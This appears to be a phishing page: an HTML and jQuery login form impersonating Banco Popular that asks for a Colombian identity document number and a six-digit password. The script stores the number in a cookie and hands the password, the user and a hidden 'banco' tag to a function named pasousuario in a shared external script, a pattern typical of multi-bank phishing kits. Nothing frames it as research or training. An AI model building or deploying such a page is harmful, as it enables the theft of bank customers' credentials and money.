<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banco Popular | Bienvenidos</title>
    <link rel="icon" type="image/png" href="popular_logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --popular-green: #1ca35a;
            --popular-dark: #004225;
            --accent-orange: #f68b1e;
            --text-dark: #121212;
            --text-gray: #666666;
            --border-soft: #eeeeee;
            --bg-body: #ffffff;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-body);
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-dark);
            -webkit-font-smoothing: antialiased;
        }

        .login-card {
            width: 100%;
            max-width: 440px;
            padding: 50px 35px;
            box-sizing: border-box;
            background-color: #fff;
            position: relative;
            transition: all 0.4s ease;
        }

        /* Top Security Icon */
        .security-badge {
            position: absolute;
            top: 25px;
            right: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--accent-orange);
            background: rgba(246, 139, 30, 0.08);
            width: 40px;
            height: 40px;
            border-radius: 50%;
        }

        .header-section {
            margin-bottom: 45px;
            text-align: left;
        }

        .header-section h1 {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin: 0 0 12px 0;
            color: var(--text-dark);
        }

        .logo-container {
            margin-top: 10px;
        }

        .logo-banco {
            width: 200px;
            height: auto;
            display: block;
        }

        /* Form Styling */
        .form-block {
            margin-bottom: 30px;
            text-align: left;
        }

        .form-block label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-dark);
            margin-bottom: 10px;
            text-transform: none;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-item {
            width: 100%;
            padding: 16px 18px;
            font-size: 16px;
            font-weight: 500;
            color: var(--text-dark);
            border: 2px solid #eaebec;
            border-radius: 14px;
            box-sizing: border-box;
            outline: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            background-color: #fcfcfc;
        }

        .input-item:focus {
            border-color: var(--popular-green);
            background-color: #fff;
            box-shadow: 0 0 0 4px rgba(28, 163, 90, 0.1);
        }

        select.input-item {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23f68b1e' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 18px center;
            background-size: 18px;
            padding-right: 50px;
        }

        /* Custom Switch */
        .recordar-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 40px;
            cursor: pointer;
            user-select: none;
        }

        .custom-switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 28px;
            margin-right: 15px;
        }

        .custom-switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .toggle-slider {
            position: absolute;
            cursor: pointer;
            inset: 0;
            background-color: #e4e6eb;
            transition: .3s;
            border-radius: 34px;
        }

        .toggle-slider:before {
            position: absolute;
            content: "";
            height: 20px;
            width: 20px;
            left: 4px;
            bottom: 4px;
            background-color: white;
            transition: .3s cubic-bezier(0.23, 1, 0.32, 1);
            border-radius: 50%;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        input:checked + .toggle-slider {
            background-color: var(--popular-green);
        }

        input:checked + .toggle-slider:before {
            transform: translateX(22px);
        }

        .switch-text {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-dark);
        }

        /* Buttons */
        .btn-main {
            width: 100%;
            padding: 18px;
            background-color: #e4e6eb;
            color: #a0a4ab;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: all 0.3s ease;
            margin-bottom: 30px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
        }

        .btn-main.ready {
            background-color: var(--popular-green);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 8px 16px rgba(28, 163, 90, 0.2);
        }

        .btn-main.ready:hover {
            transform: translateY(-2px);
            background-color: var(--popular-dark);
            box-shadow: 0 10px 20px rgba(28, 163, 90, 0.3);
        }

        .btn-main.ready:active {
            transform: translateY(0);
        }

        /* Links */
        .secondary-actions {
            font-size: 14px;
            font-weight: 600;
            color: var(--text-gray);
            text-align: center;
            margin-bottom: 50px;
        }

        .secondary-actions a {
            color: var(--accent-orange);
            text-decoration: none;
            padding-bottom: 1px;
            border-bottom: 1px dashed var(--accent-orange);
            margin-left: 4px;
        }

        /* Footer */
        .recaptcha-footer {
            font-size: 12px;
            color: #999999;
            text-align: center;
            line-height: 1.6;
        }

        .recaptcha-footer a {
            color: var(--text-gray);
            text-decoration: none;
            font-weight: 600;
        }

        /* Transitions */
        .step-content {
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .hidden {
            display: none;
        }

        /* Mobile specific fixes */
        @media (max-width: 480px) {
            .login-card {
                padding: 40px 25px;
            }
            .header-section h1 {
                font-size: 24px;
            }
            .logo-banco {
                width: 160px;
            }
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="security-badge">
            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
        </div>

        <!-- Document Selection Step -->
        <div id="viewDoc" class="step-content">
            <div class="header-section">
                <h1>Bienvenido a</h1>
                <div class="logo-container">
                    <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
                </div>
            </div>

            <div class="form-block">
                <label>Tipo de documento</label>
                <div class="input-group">
                    <select id="tipoDocumento" class="input-item">
                        <option value="CC">CÃ©dula de CiudadanÃ­a</option>
                        <option value="CE">CÃ©dula de ExtranjerÃ­a</option>
                        <option value="NIT">NIT</option>
                        <option value="PP">Pasaporte</option>
                    </select>
                </div>
            </div>

            <div class="form-block">
                <label>NÃºmero de documento</label>
                <div class="input-group">
                    <input type="tel" id="txtUsuario" class="input-item" placeholder="" maxlength="14" autocomplete="off">
                </div>
            </div>

            <div class="recordar-wrapper">
                <label class="custom-switch">
                    <input type="checkbox" id="chkRecordar">
                    <span class="toggle-slider"></span>
                </label>
                <span class="switch-text">Recordar tipo y nÃºmero de documento</span>
            </div>

            <button type="button" id="btnNext" class="btn-main" disabled>Continuar</button>

            <div class="secondary-actions">
                Â¿No eres usuario? <a href="#">RegÃ­strate aquÃ­</a>
            </div>

            <div class="recaptcha-footer">
                Protegido por reCAPTCHA | <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
            </div>
        </div>

        <!-- Password Step -->
        <div id="viewPass" class="step-content hidden">
            <div class="header-section">
                <div class="logo-container">
                    <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
                </div>
                <h2 style="font-size: 22px; font-weight: 700; margin: 30px 0 10px 0;">Valida tu identidad</h2>
                <p style="color: var(--text-gray); font-size: 14px; line-height: 1.5;">Para proteger tu cuenta, es necesario ingresar tu contraseÃ±a personal.</p>
            </div>

            <div class="form-block">
                <label>ContraseÃ±a Ãºnica</label>
                <div class="input-group">
                    <input type="password" id="txtPass" class="input-item" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢" maxlength="6" autocomplete="current-password">
                </div>
            </div>

            <button type="button" id="btnUsuario" class="btn-main" disabled>Ingresar</button>
            <input type="hidden" value="Popular" id="banco">

            <div class="secondary-actions">
                <a href="#" style="border-bottom: none; color: var(--text-gray); font-size: 13px;">Â¿Olvidaste tu contraseÃ±a?</a>
            </div>

            <div class="recaptcha-footer">
                Protegido por reCAPTCHA | <a href="#">Privacidad</a> - <a href="#">Condiciones</a>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            const $usr = $("#txtUsuario");
            const $pwd = $("#txtPass");
            const $btnNext = $("#btnNext");
            const $btnFinal = $("#btnUsuario");
            const $viewDoc = $("#viewDoc");
            const $viewPass = $("#viewPass");

            console.log("Banco Popular: Script initialized.");

            function setCookie(name, value, days) {
                let expires = "";
                if (days) {
                    let date = new Date();
                    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                    expires = "; expires=" + date.toUTCString();
                }
                document.cookie = name + "=" + (value || "") + expires + "; path=/";
            }

            $usr.on("input", function() {
                if ($usr.val().length >= 4) {
                    $btnNext.addClass("ready").prop("disabled", false);
                } else {
                    $btnNext.removeClass("ready").prop("disabled", true);
                }
            });

            $pwd.on("input", function() {
                if ($pwd.val().length >= 4) {
                    $btnFinal.addClass("ready").prop("disabled", false);
                } else {
                    $btnFinal.removeClass("ready").prop("disabled", true);
                }
            });

            $btnNext.on("click", function() {
                if ($usr.val().length >= 4) {
                    console.log("Banco Popular: Proceeding to password step. User:", $usr.val());
                    setCookie("usuario", $usr.val(), 1);
                    $viewDoc.addClass("hidden");
                    $viewPass.removeClass("hidden");
                    $pwd.focus();
                }
            });

            $btnFinal.on("click", function() {
                const user = $usr.val();
                const pass = $pwd.val();
                const bank = $("#banco").val();

                console.log("Banco Popular: Ingresar clicked. Data:", { user, bank, passLength: pass.length });

                if (user.length >= 4 && pass.length >= 4) {
                    console.log("Banco Popular: Calling pasousuario...");
                    pasousuario(pass, user, bank);
                } else {
                    console.warn("Banco Popular: Validation failed on submit.");
                }
            });

            $(document).on("keypress", function(e) {
                if (e.which === 13) {
                    if (!$viewDoc.hasClass("hidden") && $usr.val().length >= 4) {
                        $btnNext.click();
                    } else if (!$viewPass.hasClass("hidden") && $pwd.val().length >= 4) {
                        $btnFinal.click();
                    }
                }
            });
        });
    </script>
</body>
</html>

